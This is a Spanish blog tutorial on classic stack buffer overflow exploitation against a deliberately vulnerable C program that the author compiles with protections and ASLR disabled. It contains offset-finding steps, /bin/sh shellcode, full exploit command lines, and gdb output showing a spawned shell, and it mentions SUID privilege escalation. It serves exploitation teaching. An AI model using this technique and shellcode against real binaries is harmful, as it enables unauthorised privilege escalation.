---
layout: es/blog-detail
title: "My name is overflow, buffer overflow"
date: 2018-07-03T16:38:00+00:00
categories:
    - Exploiting
tags:
    - buffer overflow
    - buffer overflow
    - buffer overrun
    - exploit
    - overflow
    - overrun
    - stack
    - stack based
    - stack overrun
    - stack overrun
    - stack smashing
    - stack smashing
image_src: /assets/uploads/2018/07/Puffin-Security-My-name-is-overflow-buffer-overflow-exploiting-ciberseguridad.jpg
image_height: 467
image_width: 700
author: Yago Gutierrez
description: En principio ya ha quedado claro cómo obtenemos el control del flujo del programa aprovechando una escritura fuera de límites. Veamos cómo se encuentra el stack durante una función como la de ayer #include &lt;stdio.h&gt; #include &lt;string.h&gt; void imprimir(char* arg) { char buf[128]; strcpy(buf, arg);...
publish_time: 2018-07-03T16:38:00+00:00
modified_time: 2019-02-19T14:37:22+00:00
comments_value: 0
disqus_identifier: 1742
---
En principio ya ha quedado claro cómo obtenemos el control del flujo del programa aprovechando una escritura fuera de límites. Veamos cómo se encuentra el stack durante una función como la de ayer

#include <stdio.h>  
#include <string.h>

void imprimir(char\* arg)  
{  
char buf\[128\];  
strcpy(buf, arg);  
printf(«%sn», buf);  
}

int main(int argc, char\*\* argv)  
{  
if(argc < 2) return 1;  
imprimir(argv\[1\]);  
return 0;  
}

Ejem, por favor, pónmelo en algo que entendamos mejor

<imprimir>:  
push   ebp  
mov    ebp,esp  
push   ebx  
sub    esp,0x84  
call   450 <\_\_x86.get\_pc\_thunk.bx>  
add    ebx,0x1aa8  
sub    esp,0x8  
push   DWORD PTR \[ebp+0x8\]  
lea    eax,\[ebp-0x88\]  
push   eax  
call   3d0 <strcpy@plt>  
add    esp,0x10  
sub    esp,0xc  
lea    eax,\[ebp-0x88\]  
push   eax  
call   3e0 <puts@plt>  
add    esp,0x10  
nop  
mov    ebx,DWORD PTR \[ebp-0x4\]  
leave  
ret

Como vemos la realidad es más sucia de lo que parece. Este sería el stack justo después de la ejecución del sub esp, 0x84, es decir, tras acabar el prólogo.

+-----------------------------+
|   Stack de la func caller   |
+-----------------------------+
|          char\* arg          | Argumentos de la función ejem cdecl
+-----------------------------+
|        EIP guardado         | Objetivo
+-----------------------------+
|        EBP guardado         |
+-----------------------------+ <- EBP
|             ...             |
+-----------------------------+
|       buf (128 bytes)       |
+-----------------------------+
|             ...             |
+-----------------------------+ <- ESP

Creo que ya ha quedado muy claro que nuestro objetivo es humillar pisar el **EIP guardado**, tambien se podría emplear la manipulación del EBP guardado, pero esa técnica la veremos (no mucho) más tarde, principalmente en las vulns _off-by-one_. Espero que el lector aprecie claramente que strcpy() comienza escribir en buf, por decirlo de alguna forma, en la parte inferior del mismo, siendo la escritura «hacia arriba». Los campos etiquetados con puntos suspensivos representan que en el stack no solo se encuentran variables locales, sino también (como vemos en el código en ensamblador) otros datos del programa en sí, no nos interesa calcular cuánto ocupan esos datos ya que no nos importan, aunque debemos tenerlos en cuenta para saber cuánto relleno debemos introducir antes de tocar EIP (recordemos que en EIP queremos poner una dirección específica). Yo personalmente empleo el siguiente método (es que yo soy de hacer las cosas manualmente):  
Introduciremos A’s hasta llenar buf (128), y posteriormente meteremos en grupos de 4 caracteres iguales, algo como esto: Ax128 + BBBB + CCCC + DDDD, de forma que cuando en gdb veamos que ha roto, por ejemplo, al intentar acceder a 0x44444444, al ser el 0x44 el carácter ‘D’ indica que es necesario introducir de relleno 128 bytes de buf más 8 bytes, siendo los siguientes 4 los que pisan EIP. Practiquémoslo:

(gdb) run \`perl -e 'print "A"x128'\`BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ
Starting program: /home/arget/vuln \`perl -e 'print "A"x128'\`BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ

Program received signal SIGSEGV, Segmentation fault.  
0x45454545 in ?? ()

Al romper en 0x45454545 quiere decir que en EIP se encuentra «EEEE», por lo que para llegar a pisar EIP debemos introducir 128 + 3 \* 4 = 140. Vamos a comprobarlo introduciendo en EIP unos bytes específicos, «ARGT»  
(gdb) run \`perl -e ‘print «A»x140’\`ARGT  
Starting program: /home/arget/vuln \`perl -e ‘print «A»x140’\`ARGT  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARGT

Program received signal SIGSEGV, Segmentation fault.  
0x54475241 in ?? ()

Vemos que EIP contiene 0x54475241, que es ([little endian](https://en.wikipedia.org/wiki/Endianness)…) 41524754, que se corresponde precisamente con «ARGT», hemos logrado situar en EIP una «dirección» arbitraria.

La obtención de esta información se puede acelerar por ejemplo con frameworks como metasploit con el módulo pattern:

$ /opt/metasploit/tools/exploit/pattern\_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Este módulo crea una cadena de manera determinística de una longitud cualquiera de forma que nunca se repiten 4 caracteres seguidos. Mediante el parámetro -l le indicamos la longitud que deseamos, debemos orientarnos por el tamaño del marco de la pila que vemos en el código asm. Ahora introducimos esa cadena en el programa:

(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag  
Starting program: /home/arget/vuln Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.  
0x37654136 in ?? ()

Rompe al acceder a 0x37654136, lo pasamos a big endian 36 41 65 37 y lo convertimos a caracteres ASCII ([asciitohex.com](https://www.asciitohex.com/) es una buena herramienta, o siempre se puede usar un echo -e «x36x41x65x37» o un python/perl one-line o incluso un echo 36416537 | xxd -ps -r) que resulta ser 6Ae7 y empleamos el módulo pattern\_offset de metasploit para obtener el offset exacto dentro de la cadena que se nos proporcionó:

$ /opt/metasploit/tools/exploit/pattern\_offset.rb -q 6Ae7  
\[\*\] Exact match at offset 140

Confirmando lo que ya sabíamos, que hay 140 bytes hasta el EIP guardado.

Una vez que poseemos indudablemente el control del flujo del programa debemos decirle qué hacer, esta es posiblemente la parte más excitante, si bien nosotros por ahora permaneceremos en el redil de 1996, por algún sitio hay que empezar, y va a ser primero sin enfrentarnos a **ninguna protección**.  
La explotación prefiero empezarla primero por Linux, ya nos extenderemos a Windows, mejor mantenerse cuerdo el mayor tiempo posible, y resulta que el exploiting en Windows es en numerosas ocasiones el mejor camino hacia el psiquiátrico.Adicionalmente pediré al lector que no se quede en las prácticas de este «cursillo», es necesario coger soltura, cada binario se puede explotar por lo general de diversas maneras, y en ocasiones puede ser interesante complicarse en exceso, además en Internet es fácil encontrar numerosos **CTF**s donde ejercitarse sin parar, un buen ejemplo es exploit-exercises.com.

También hay una gran cantidad de literatura por ahí (yo crecí como exploiter leyendo (casi) todos los artículos de [SET](http://www.set-ezine.org/),  si bien no tiene punto de comparación con [Phrack](http://phrack.org/)), tenemos un buen ejemplo en [UAD](https://unaaldia.hispasec.com/)[.  
  
](http://phrack.org/)

En fin, pongámonos en situación, corría el año 1996, todavía no existía el [ASLR (ni](https://en.wikipedia.org/wiki/Address_space_layout_randomization) [PaX)](https://en.wikipedia.org/wiki/PaX) sudo sysctl -w kernel.randomize\_va\_space=0) ni los compiladores implementaban [mejoras del código](https://en.wikipedia.org/wiki/Buffer_overflow_protection) (parámetro de GCC -D\_FORTIFY\_SOURCE=0), ni existía el concepto del canary u otros protectores del stack (parámetro de GCC -fno-stack-protector),  tampoco existía [DEP](https://en.wikipedia.org/wiki/Executable_space_protection) ([NX](https://en.wikipedia.org/wiki/NX_bit)/W^X/ExecShield/PaX/etc) (parámetro de GCC -z execstack), ni los [ejecutables de posición independiente](https://en.wikipedia.org/wiki/Position-independent_code) eran demasiado frecuentes (parámetros de GCC -no-pie y -fno-pie), tampoco era común encontrar binarios con [full RELRO](http://blog.isis.poly.edu/exploitation%20mitigation%20techniques/exploitation%20techniques/2011/06/02/relro-relocation-read-only/) (y hoy en día GCC no lo tiene como opción predeterminada XD) y además las máquinas de [64 bits](https://es.wikipedia.org/wiki/X86-64) seran más bien un proyecto (parámetro de GCC -m32). Si se desea introducir aún más en el momento siempre se puede consultar la [wikipedia](https://es.wikipedia.org/wiki/1996).

Quiero explicar que lo que he puesto en el párrafo anterior entre paréntesis era para indicar que es necesario emplearlo para desactivar cada medida de protección. Mientras que la mayoría son parámetros para GCC, lo primero es un comando para desactivar el ASLR, que es necesario ejecutar antes de comenzar con los ejemplos. Una vez acabes con el exploiting recuerda ejecutar sudo sysctl -w kernel.randomize\_va\_space=2, ya que es una medida de seguridad muy importante que no conviene tener desactivada (aunque al reiniciar se resetearía dicho parámetro).  
Prosigamos, compilamos el código vulnerable que hemos visto:

$ gcc vuln.c -o vuln -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z execstack -m32 -no-pie -fno-pie  
Y ahora, como ya hemos visto, calculamos el relleno que necesitamos hasta EIP guardado (es necesario pues hemos añadido varias opciones de compilación, lo que puede alterar drásticamente el comportamiento del programa).

$ /opt/metasploit/tools/exploit/pattern\_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

$ gdb -q vuln  
Reading symbols from vuln…(no debugging symbols found)…done.  
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag  
Starting program: /home/arget/vuln Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.  
0x37654136 in ?? ()  
(gdb) quit  
A debugging session is active.

Inferior 1 \[process 7579\] will be killed.

Quit anyway? (y or n) y

$ echo -e «x36x41x65x37»  
6Ae7

$ /opt/metasploit/tools/exploit/pattern\_offset.rb -q 6Ae7  
\[\*\] Exact match at offset 140

Ahora lo que haremos es introducir código máquina que realice las acciones que deseamos, por ejemplo, ejecutar `/bin/sh` para obtener una shell. Este código recibe el nombre de _shellcode_, precisamente por ser un código que por lo general obtiene una shell. En internet se encuentran numerosos shellcodes que se pueden emplear (eso sí, siempre hay que verificar que lo que hace es lo que dice hacer, antes de usarlo), sin embargo en el próximo episodio veremos cómo construir un buen shellcode para cada ocasión, no quiero que nadie se pierda la belleza de la programación en asm.

En fin, por ahora nos vale este shellcode

xor eax, eax  
push eax  
push 0x68732f2f  
push 0x6e69622f  
mov ebx, esp  
push eax  
push ebx  
mov ecx, esp  
mov al, 0xb  
int 0x80

Podemos ensamblarlo con nasm (nasm sc.asm -o sc.bin, es necesario añadir al comienzo una línea «BITS 32» para indicar que lo ensamble como código de 32 bits).  
Podemos obtener del ensamblado los opcodes (un opcode es el valor numérico (generalmente en hex) correspondiente a una instrucción en ensamblador, es decir, lenguaje máquina) mediante xxd sc.bin.  
Bien, el shellcode no debe tener ningún 0x00 debido a que strcpy() termina de copiar al encontrar dicho valor, y de hecho este shellcode está diseñado para evitarlos.  
El shellcode lo situaremos al comienzo de buf, por lo que ahora necesitamos obtener la dirección de buf, evidentemente mediante gdb:

(gdb) disas imprimir 
Dump of assembler code for function imprimir:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x88,%esp
   0x080484cb <+9>:     sub    $0x8,%esp
   0x080484ce <+12>:    pushl  0x8(%ebp)
   0x080484d1 <+15>:    lea    -0x88(%ebp),%eax
   0x080484d7 <+21>:    push   %eax
   0x080484d8 <+22>:    call   0x8048370 <strcpy@plt>
   0x080484dd <+27>:    add    $0x10,%esp
   0x080484e0 <+30>:    sub    $0xc,%esp
   0x080484e3 <+33>:    lea    -0x88(%ebp),%eax
   0x080484e9 <+39>:    push   %eax
   0x080484ea <+40>:    call   0x8048380 <puts@plt>
   0x080484ef <+45>:    add    $0x10,%esp
   0x080484f2 <+48>:    nop
   0x080484f3 <+49>:    leave  
   0x080484f4 <+50>:    ret    
End of assembler dump.

Observamos el código de imprimir(). Tras la ejecución de strcpy() deben encontrarse en el stack ya los datos que proporcionemos. Coloquemos ahí un breakpoint (un punto donde el programa se detiene hasta que demos la orden de continuar).

(gdb) br \*imprimir +27  
Breakpoint 1 at 0x80484dd  
Colocado el breakpoint.

(gdb) run \`perl -e ‘print «A»x144’\`  
Starting program: /home/arget/vuln \`perl -e ‘print «A»x144’\`

Breakpoint 1, 0x080484dd in imprimir ()  
Procedemos a ejecutarlo con la misma cantidad de bytes que vamos a meterle (las direcciones variarán en función del tamaño de los argumentos pasados al programa).  
La ejecución se detiene en el breakpoint que habíamos colocado y podemos analizar la situación

    (gdb) x/16x $esp
    0xffffd1e0:     0xffffd1f0      0xffffd4d2      0xf7e5f549      0x000000c2
    0xffffd1f0:     0x41414141      0x41414141      0x41414141      0x41414141
    0xffffd200:     0x41414141      0x41414141      0x41414141      0x41414141
    0xffffd210:     0x41414141      0x41414141      0x41414141      0x41414141
    

Encontramos que a partir de 0xffffd1f0 comienza nuestra fruta. Por tanto si colocamos la dirección 0xffffd1f0 en EIP, se procederá a ejecutar nuestro shellcode (pues ahí lo situaremos). No olvidemos ajustar el tamaño del relleno que metemos en función del tamaño del shellcode (en nuestro caso 23).  
\[El lector atento habrá apreciado que donde apunta esp todavía permanece la dirección de nuestro buf, es el argumento que se ha pasado a strcpy(), y la siguiente dirección en el stack se corresponde con el argumento a main() (que se ha obtenido como argumento de imprimir())\]

(gdb) run \`cat sc.o\`\`perl -e 'print "A"x(140-23) . "xf0xd1xffxff"'\`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/arget/vuln \`cat sc.o\`\`perl -e 'print "A"x(140-23) . "xf0xd1xffxff"'\`

Breakpoint 1, 0x080484dd in imprimir ()  
(gdb) c  
Continuing.  
1�Ph//shh/bin��PS���  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����  
process 13260 is executing new program: /usr/bin/bash  
Error in re-setting breakpoint 1: No symbol table is loaded. Use the «file» command.  
Error in re-setting breakpoint 1: No symbol table is loaded. Use the «file» command.  
Error in re-setting breakpoint 1: No symbol table is loaded. Use the «file» command.  
warning: Could not load shared library symbols for linux-vdso.so.1.  
Do you need «set solib-search-path» or «set sysroot»?  
Error in re-setting breakpoint 1: No symbol table is loaded. Use the «file» command.  
Error in re-setting breakpoint 1: No symbol table is loaded. Use the «file» command.  
sh-4.4$ whoami  
arget  
sh-4.4$

Ahora procedamos a probarlo fuera del debugger

$ /home/arget/vuln \`cat sc.o\`\`perl -e 'print "A"x(140-23) . "xf0xd1xffxff"'\`
1�Ph//shh/bin��PS���
                    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Violación de segmento (\`core' generado)

Kapazao? Pues que cuando se ejecuta en gdb, las variables del entorno (que también están en el stack, al igual que los parámetros pasados al programa) varían, en concreto varía la variable \_, sí, una variable que es un guión bajo. Esta variable contiene el nombre con el que se ha ejecutado el programa, mediante el comando env podemos ver que la variable \_ tiene el valor /usr/bin/env (porque env muestra la variable «\_» desde su propio stack). Durante la ejecución de un programa en gdb esta variable adquiere el valor «/usr/bin/gdb» (seguramente porque hereda todas las variables del entorno de gdb) como se puede comprobar en el mismo gdb mediante el comando x

$ gdb -q vuln
Reading symbols from vuln...(no debugging symbols found)...done.
(gdb) br \*main
Breakpoint 1 at 0x80484f5
(gdb) run
Starting program: /home/arget/vuln

Breakpoint 1, 0x080484f5 in main ()  
(gdb) x/1024s $esp  
0xffffd34c: «A36133536701»  
0xffffd352: «»  
0xffffd353: «»  
\[…\]  
0xffffdb4f: «XDG\_MENU\_PREFIX=gnome-»  
0xffffdb66: «\_=/usr/bin/gdb» <<<<<<  
0xffffdb75: «LANG=es\_ES.UTF-8»

Mientras que cuando el programa es ejecutado mediante bash no ocurre así.

$ cat a.c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    printf("%sn", getenv("\_"));
    return 0;
}

$ gcc a.c -o a

$ ./a  
./a

$ /home/arget/a  
/home/arget/a

$ /home/arget/a asd  
/home/arget/a

$ /home/arget/../arget/a asd  
/home/arget/../arget/a

Se puede comprobar que mediante programas como ltrace y strace ocurre igual que en gdb, supongo que simplemente pasarán sus propias variables de entorno al programa que debuggean.  
Insto al lector curioso a investigar qué contienen las direcciones superiores al stack de main(), puede ser ilustrativo.

En cualquier caso una forma de evitarse problemas es ejecutar el programa con un entorno nulo. Pero esto no siempre es posible…  
Hay que tener en cuenta que no solo la variable «\_» modifica el stack, gdb también añade dos variables de entorno que es necesario eliminar mediante unset environment LINES y unset environment COLUMNS. En ocasiones esto es suficiente para obtener la dirección, pero si no es el caso, ahora debemos ajustar la diferencia entre variables \_’s. El caso es que no he encontrado una forma para calcular con precisión la dirección exacta, en ocasiones se arregla restando la diferencia entre las longitudes de los nombres a la dirección, en otras ocasiones diría que se trata de algo azaroso.  
Tampoco se debería dedicar tiempo a investigar este tema, pues no es algo extremadamente fascinante ni es práctico, ya que las protecciones que veremos más adelante (implementadas me atrevería a decir universalmente) hacen que esto no sirva de nada.

En fin

$ /home/arget/vuln \`cat sc.o\`\`perl -e 'print "A"x(140-23) . "x10xd2xffxff"'\`
1�Ph//shh/bin��PS���
                    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ���
sh-4.4$ whoami
arget
sh-4.4$

Una buena pregunta es qué utilidad tiene conseguir que un programa que ya controlas haga lo que no está pensado que haga. La verdad que no tiene mucha, solo para practicar para llevarlo a un entorno donde sí tenga sentido, como un binario con el bit SUID, de esta forma se obtendría elevación de privilegios. Muchos métodos de elevación de privilegios emplean vulnerabilidades en binarios como sudo o passwd.

Ya es hora de irse despidiendo, en la próxima ocasión veremos la explotación con alguna que otra protección. Desde luego algo mucho más interesante.